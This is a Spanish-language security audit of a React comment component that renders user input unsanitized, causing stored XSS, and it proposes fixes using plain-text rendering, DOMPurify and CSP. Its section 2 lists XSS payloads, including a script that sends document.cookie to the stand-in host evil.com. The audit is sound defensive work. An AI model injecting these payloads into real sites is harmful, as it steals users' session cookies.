# Auditoría de Seguridad XSS - Componente Comment.jsx

**Fecha:** 3 de marzo de 2025  
**Archivo auditado:** `src/components/Comment.jsx`  
**Severidad:** Alta (Crítica en producción)

---

## 1. Resumen ejecutivo

El componente `Comment` presenta una **vulnerabilidad de Cross-Site Scripting (XSS)** de tipo almacenado (stored XSS) al renderizar datos de usuario sin sanitización. Un atacante puede inyectar código JavaScript malicioso que se ejecutará en el navegador de todos los usuarios que visualicen el comentario.

---

## 2. Problemas identificados

### 2.1 Uso de `dangerouslySetInnerHTML` sin sanitización

**Ubicación:** Líneas 16-19 y 22-25 de `Comment.jsx`

```jsx
<span
  className="comment-author"
  dangerouslySetInnerHTML={{ __html: author }}
/>
// ...
<div
  className="comment-content"
  dangerouslySetInnerHTML={{ __html: content }}
/>
```

**Problema:** React ofrece `dangerouslySetInnerHTML` para inyectar HTML crudo. El nombre ya advierte del riesgo: cualquier HTML introducido se renderiza tal cual, incluyendo etiquetas `<script>`, atributos de eventos (`onerror`, `onclick`, `onload`) y otros vectores de ataque.

### 2.2 Campo `author` (nombre)

- **Riesgo:** El nombre del autor se renderiza con `dangerouslySetInnerHTML`.
- **Vector de ataque:** Un atacante puede registrarse como `<img src=x onerror=alert(document.cookie)>` y robar sesiones de otros usuarios.
- **Impacto:** El nombre no necesita formato HTML; usar HTML aquí es innecesario y aumenta la superficie de ataque.

### 2.3 Campo `content` (contenido del comentario)

- **Riesgo:** El contenido admite HTML para formato (`<b>`, `<i>`), pero se acepta **cualquier** HTML.
- **Vector de ataque:** Payloads como:
  - `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`
  - `<svg onload=alert('XSS')>`
  - `<b onclick=alert('XSS')>click me</b>`
- **Impacto:** Ejecución de código arbitrario en el contexto de la aplicación.

### 2.4 Falta de validación en origen

El formulario `CommentForm.jsx` no valida ni sanitiza la entrada antes de enviarla. Los datos se pasan directamente a `onSubmit` y se almacenan en el estado de la aplicación.

---

## 3. Soluciones propuestas

### 3.1 Campo `author` — Renderizar como texto plano

**Solución:** No usar `dangerouslySetInnerHTML` para el autor. React escapa automáticamente el texto cuando se usa `{author}`.

```jsx
<span className="comment-author">{author}</span>
```

**Beneficio:** Elimina completamente el riesgo XSS en el nombre sin perder funcionalidad (los nombres no requieren HTML).

### 3.2 Campo `content` — Sanitización con DOMPurify

**Solución:** Usar la librería **DOMPurify** (ya instalada en el proyecto) con una lista blanca de etiquetas permitidas.

- **Etiquetas permitidas:** `<b>`, `<i>`, `<strong>`, `<em>` (formato básico)
- **Resto:** Eliminado por DOMPurify (scripts, eventos, iframes, etc.)

```jsx
import DOMPurify from 'dompurify'

const ALLOWED_TAGS = ['b', 'i', 'strong', 'em']

const sanitizedContent = DOMPurify.sanitize(content, { ALLOWED_TAGS })
```

**Beneficio:** Se mantiene el formato deseado (`<b>`, `<i>`) y se bloquean scripts y atributos peligrosos.

### 3.3 Defensa en profundidad (opcional)

- **Validación en el formulario:** Rechazar o sanitizar en el cliente antes de enviar.
- **Validación en backend:** Si existe API, sanitizar también en servidor.
- **Content Security Policy (CSP):** Cabecera HTTP que restringe fuentes de scripts ejecutables.

---

## 4. Resumen de cambios a aplicar

| Campo   | Antes                          | Después                                      |
|---------|--------------------------------|----------------------------------------------|
| `author`| `dangerouslySetInnerHTML`      | Renderizado como texto `{author}`            |
| `content`| `dangerouslySetInnerHTML`     | `DOMPurify.sanitize()` con whitelist         |

---

## 5. Referencias

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [React: dangerouslySetInnerHTML](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)
- [DOMPurify - Sanitize HTML](https://github.com/cure53/DOMPurify)
